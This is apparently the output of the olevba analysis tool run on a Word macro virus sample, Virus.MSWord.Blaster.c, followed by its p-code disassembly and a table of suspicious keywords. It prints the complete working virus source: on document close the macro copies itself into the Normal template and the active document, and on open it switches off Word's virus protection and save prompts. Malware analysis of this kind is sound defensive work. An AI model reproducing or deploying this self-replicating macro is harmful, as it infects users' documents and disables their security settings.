olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blaster.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blaster.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    Dim stato As Boolean
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim stress As String
    Dim bry As Variant

    On Error Resume Next

    stato = ActiveDocument.Saved

    SetAttr "c:\cont.dbl", vbNormal
    Kill "c:\cont.dbl"

    Open "c:\cont.dbl" For Output As #1

    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    Close #1
        
    SetAttr "c:\cont.dbl", vbNormal

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpynorm
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpynorm:
        Close #1
    End If

    flagaltro = False
    flagio = False
    
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
   
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpyacti
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpyacti:
        Close #1
    End If

    Kill "c:\cont.dbl"

    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If

    ActiveDocument.Saved = stato
    
    On Error GoTo 0
End Sub
Private Sub Document_Open()
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim bry As Variant

    On Error Resume Next

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim flagaltro As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If

    On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Blaster.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9899 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	Dim 
' 	VarDefn stato (As Boolean)
' Line #2:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #3:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #4:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #5:
' 	Dim 
' 	VarDefn stress (As String)
' Line #6:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #7:
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #11:
' Line #12:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #13:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #14:
' Line #15:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #16:
' Line #17:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #18:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' Line #21:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #23:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #24:
' 	Loop 
' Line #25:
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #27:
' Line #28:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #29:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #30:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' Line #32:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #34:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #35:
' 	Loop 
' Line #36:
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #39:
' Line #40:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #41:
' Line #42:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #43:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #44:
' Line #45:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #46:
' Line #47:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #48:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #50:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #51:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #53:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #54:
' 	ExitFor 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' Line #59:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #61:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #62:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' Line #64:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #65:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #66:
' 	Loop 
' Line #67:
' Line #68:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #69:
' Line #70:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #71:
' 	EndIfBlock 
' Line #72:
' Line #73:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #74:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #75:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpynorm 
' 	EndIf 
' Line #76:
' 	LitDI2 0x0001 
' 	St count 
' Line #77:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #78:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #79:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #81:
' 	Loop 
' Line #82:
' 	Label cpynorm 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' Line #86:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #87:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #88:
' Line #89:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #90:
' Line #91:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #92:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #93:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #94:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #95:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #96:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #97:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #98:
' 	ExitFor 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' Line #103:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #105:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #106:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' Line #108:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #109:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #110:
' 	Loop 
' Line #111:
' Line #112:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #113:
' Line #114:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #115:
' 	EndIfBlock 
' Line #116:
' Line #117:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #118:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #119:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyacti 
' 	EndIf 
' Line #120:
' 	LitDI2 0x0001 
' 	St count 
' Line #121:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #122:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #123:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #124:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #125:
' 	Loop 
' Line #126:
' 	Label cpyacti 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #128:
' 	EndIfBlock 
' Line #129:
' Line #130:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #131:
' Line #132:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #133:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #134:
' 	EndIfBlock 
' Line #135:
' Line #136:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #137:
' Line #138:
' 	OnError (GoTo 0) 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Private Sub Document_Open())
' Line #141:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #142:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #143:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #144:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #145:
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' Line #148:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #149:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #150:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #151:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #152:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #153:
' 	EndWith 
' Line #154:
' Line #155:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #156:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #157:
' Line #158:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #159:
' Line #160:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #161:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #162:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #163:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #164:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #165:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #166:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #167:
' 	ExitFor 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #171:
' Line #172:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #173:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #174:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #175:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #176:
' Line #177:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #178:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #179:
' 	Loop 
' Line #180:
' Line #181:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #182:
' Line #183:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #184:
' 	EndIfBlock 
' Line #185:
' Line #186:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #187:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #188:
' Line #189:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #190:
' Line #191:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #192:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	IfBlock 
' Line #193:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #194:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #195:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0018 "Dim flagaltro As Boolean"
' 	Eq 
' 	IfBlock 
' Line #196:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #197:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #198:
' 	ExitFor 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	EndIfBlock 
' Line #201:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #202:
' Line #203:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #204:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #205:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #206:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #207:
' Line #208:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #209:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #210:
' 	Loop 
' Line #211:
' Line #212:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #213:
' Line #214:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #215:
' 	EndIfBlock 
' Line #216:
' Line #217:
' 	OnError (GoTo 0) 
' Line #218:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

